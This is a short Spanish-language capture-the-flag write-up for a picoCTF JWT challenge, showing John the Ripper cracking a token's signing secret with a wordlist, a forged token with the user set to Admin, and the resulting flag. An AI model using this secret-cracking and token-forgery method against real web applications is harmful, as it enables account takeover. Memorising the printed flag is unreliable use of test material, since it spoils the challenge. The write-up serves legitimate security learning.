Hints:
- What is that cookie?
- Have you heard of JWT?

# Solución
Una vez ingresado y ver el Jason Web Token, usar la herramienta de john para poder crackear la contraseña con la que se firmó el JWT
```
┌──(diego㉿Tallin)-[~]
└─$ john jwt -w=/usr/share/wordlists/rockyou.txt 
Created directory: /home/diego/.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:02 DONE (2025-03-29 11:31) 0.4545g/s 3362Kp/s 3362Kc/s 3362KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Despues editar el JWT con esa password y cambiando a admin el usuario y queda el siguiente JWT:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiQWRtaW4ifQ._fhKQBjX0j7E7ctMlrmIPVItohPeusmY2h7d0uXbye0
```

Cambiamos con cookie editor el JWT, guardamos y recargamos y vemos la flag
```
picoCTF{jawt_was_just_what_you_thought_44c752f5}
```